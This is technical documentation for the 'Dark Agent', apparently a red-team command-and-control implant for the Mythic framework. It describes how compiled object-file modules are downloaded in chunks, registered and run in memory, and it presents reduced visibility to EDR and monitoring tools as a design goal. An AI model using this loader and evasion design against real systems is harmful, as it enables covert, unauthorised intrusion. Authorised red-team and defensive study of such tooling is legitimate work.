# Module Loading System

This document explains how the `load` command works in the Dark Agent and details the object file module loading workflow.

## Overview

The Dark Agent provides a robust system for dynamically loading and executing object file module commands. This enables operators to extend the agent's functionality without rebuilding it, making it highly adaptable for various operational needs.

## Detailed Process

The module loading system follows these steps:

1. **Command Selection**: The operator selects a command to load from the Mythic UI.
   - The command options are dynamically generated by the agent by comparing available commands with currently loaded commands.
   - This list is provided through the `get_commands` function in `LoadArguments` class.

2. **Server File Preparation**:
   - The Mythic server locates the corresponding object file with a name pattern of `{payload_uuid}_{command_name}.o`.
   - The server assigns a unique file ID to this file for secure transfer.

3. **File Transfer Initialization**:
   - The agent receives the task with the file ID and command name.
   - It initializes a chunked download process through the `download_bof_file` method.

4. **Chunked File Download**:
   - The agent requests chunks of the object file from the Mythic server.
   - Each chunk is Base64-encoded for safe transfer.
   - The agent reassembles these chunks into the complete binary.

5. **Module Registration**:
   - The binary is loaded into the `BofRegistry` with a unique name.
   - The registry stores the raw bytes and metadata (like load time) without executing the module.
   - This minimizes memory usage and reduces the risk of memory corruption.

6. **Command Registration**:
   - The command name is added to the agent's command registry through `MessageHandler.add_command`.
   - This makes the command available for execution in future tasks.

## Implementation Details

### Server-Side (Python)

The `load.py` file implements the server-side logic:

```python
class LoadCommand(CommandBase):
  # Command definition
  cmd = "load"
  needs_admin = False
  help_cmd = "load [command]"
  description = "Load a dynamic module command into the agent."
  
  # File location logic
  async def create_go_tasking(self, taskData):
    # Find object file based on command name
    bof_search_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
      TaskID=taskData.Task.ID,
      Filename=f"{taskData.Payload.UUID}_{bof_name}.o"
    ))
    
    # Add file ID to task parameters
    taskData.args.add_arg("file_id", bof_search_resp.Files[0].AgentFileId)
```

### Agent-Side (Crystal)

The agent implements module loading in `command_handler.cr`:

```crystal
# Load an object file and register it as a Mythic command
register_command("load") do |args|
  # Extract parameters
  file_id = args["parameters"]["file_id"]?.try(&.as_s) || ""
  command_name = args["parameters"]["command"]?.try(&.as_s) || ""
  
  # Download module from file_id
  bof_data = download_bof_file(file_id, task_id)
  
  # Load the module into the registry
  bof_name = @bof_registry.load(command_name, bof_data)
  
  # Add the new command to the registry
  MessageHandler.add_command(bof_name)
end
```

### Module Registry (Crystal)

The `BofRegistry` class in `registry.cr` manages loaded modules:

```crystal
class BofRegistry
  # BofEntry stores metadata for a loaded module
  record BofEntry,
    raw_bytes : Bytes,  # The raw binary content
    load_time : Time    # When it was loaded
    
  # Map of module name to loaded module entry
  getter bofs = {} of String => BofEntry
  
  # Load a module from content and register it
  def load(name : String, bof_content : Bytes | String) : String
    # Convert content to bytes if necessary
    bytes = case bof_content
    when Bytes
      bof_content
    when String
      bof_content.to_slice
    else
      raise "Invalid content type"
    end
    
    # Store the raw bytes in the registry
    bofs[name] = BofEntry.new(
      raw_bytes: bytes,
      load_time: Time.utc
    )
    
    return name
  end
```

## Module Execution Process

When a loaded module is executed:

1. The agent looks up the module by name in the registry.
2. It creates a new `ObjectFile` instance with the raw bytes.
3. The module is initialized in memory with the provided arguments.
4. The entry point (coffee function) is executed.
5. The memory is automatically cleaned up when execution completes.

```crystal
def execute(name : String, args : Array(String)? = nil) : Int32
  # Get the module entry from registry
  entry = bofs[name]?
  
  # Create an ObjectFile instance and execute it
  obj_data = IO::Memory.new(entry.raw_bytes)
  ObjectFile.new(obj_data, args_to_use)
  
  return 0 # Success
end
```

## Build and Packaging Process

The Dark Agent includes a sophisticated system for building, packaging, and deploying object file modules. This process happens automatically during agent generation and ensures that all necessary module files are available for the agent to load at runtime.

### Build Process Overview

```
┌─────────────────┐     ┌───────────────┐     ┌─────────────────┐     ┌─────────────────┐
│                 │     │               │     │                 │     │                 │
│  Source Code    │────▶│  Build Script │────▶│ Compiled Modules│────▶│  Mythic Storage │
│  (C Files)      │     │  (build.sh)   │     │ (.o Files)      │     │                 │
│                 │     │               │     │                 │     │                 │
└─────────────────┘     └───────────────┘     └─────────────────┘     └─────────────────┘
```

### Build Steps

1. **Source Code Compilation**
   - Modules are written in C and stored in the `src/bofs/c/` directory
   - Each module must include a `coffee()` function as its entry point
   - The build script compiles each module using GCC with the command:
   ```
   gcc -fPIC -c src/bofs/c/file.c -o output/bofs/file.o -I src/bofs/c/includes
   ```

2. **Module Storage in Mythic**
   - During the agent build process, all compiled modules are uploaded to Mythic's file storage
   - Each module is stored with a filename pattern of `{payload_uuid}_{bof_name}.o`
   - These stored modules become available to the agent when it's deployed

3. **Module Loading at Runtime**
   - When an operator issues a `load` command, the agent:
     - Identifies the module by name
     - Retrieves the object file from Mythic using the file ID
     - Downloads and loads the module into memory
     - Registers the module as a command in the agent

### Inside the Build Script

The build process is handled by the `build.sh` script, which performs the following tasks:

```bash
# Find and compile all object files
build_bofs() {
    # Find all .c files in src/bofs/c directory
    for c_file in src/bofs/c/*.c; do
        base_name=$(basename "$c_file")
        output_name="${base_name%.c}.o"
        gcc -fPIC -c "$c_file" -o "output/bofs/$output_name" -I src/bofs/c/includes
    done
}
```

### Mythic Integration

The `builder.py` file in the agent's Mythic implementation handles the integration with Mythic:

```python
# Build modules and store in Mythic
build_cmd = ["./build.sh", "-b"]
proc = subprocess.Popen(build_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=str(agent_build_path))
stdout, stderr = proc.communicate()

# Get all compiled object files
bofs_dir = agent_build_path / "output" / "bofs"
bof_files = [f for f in os.listdir(bofs_dir) if f.endswith('.o')]

# Store each module in Mythic's file system
for bof_file in bof_files:
    bof_path = bofs_dir / bof_file
    bof_name = os.path.splitext(bof_file)[0]
    bof_content = open(bof_path, 'rb').read()
    
    # Store module in Mythic with payload UUID as reference
    file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
        PayloadUUID=self.uuid,
        FileContents=bof_content,
        Filename=f"{self.uuid}_{bof_file}",
        Comment=f"Available module: {bof_name}"
    ))
```

This integration ensures that:
1. Every module is compiled during the agent build process
2. Each module is uploaded to Mythic and associated with the specific payload
3. The modules are available for download by the agent when needed

### Adding Custom Modules to the Build Process

To add a new module to the build process:

1. Create a new C file in the `src/bofs/c/` directory with a `coffee()` function:
   ```c
   #include "beacon.h"
   
   void coffee() {
       // Your module code here
       BeaconPrintf(CALLBACK_OUTPUT, "Module output");
   }
   ```

2. Add a corresponding Mythic command wrapper if desired (not required, but provides UI integration)

3. The build process will automatically:
   - Compile your module
   - Upload it to Mythic
   - Make it available for loading by the agent

## Security Considerations

- Modules are stored as raw bytes and only initialized when executed, minimizing memory usage.
- Each module runs in isolation, reducing the chance of memory corruption.
- The chunked file transfer ensures integrity during download.
- Modules can be unloaded when no longer needed, reducing the agent's memory footprint.
- Modules are compiled separately from the agent, allowing for updates without redeploying the agent.

### Symbol Resolution Order (Operational Security Enhancement)

The Dark Agent uses an optimized symbol resolution order when loading modules that improves operational security:

1. **Crystal Runtime (Current Process)** - Checks the Crystal standard library and statically linked libraries first
2. **System Libraries (RTLD_DEFAULT)** - Falls back to dynamically loaded system libraries only if needed

This approach provides several operational security benefits:

- **Reduced System Calls**: By checking the Crystal stdlib first (which is already loaded in the current process), the agent avoids unnecessary `dlsym` calls to system libraries for common functions.
- **Lower Detection Surface**: Fewer interactions with the dynamic linker means less observable behavior for EDR/monitoring solutions.
- **Performance**: Symbol resolution from the current process is faster than searching through all loaded libraries.
- **Reliability**: Common functions like `malloc`, `free`, `strlen`, etc. are resolved from Crystal's runtime, ensuring consistent behavior.

The implementation prioritizes stealth by minimizing system interactions while maintaining full module compatibility.

## Summary

The load command and module build system provide a powerful mechanism for dynamically extending agent capabilities at runtime through secure module loading. This system enables operators to add functionality to a running agent without needing to rebuild or redeploy it, making it highly flexible for various operational scenarios.
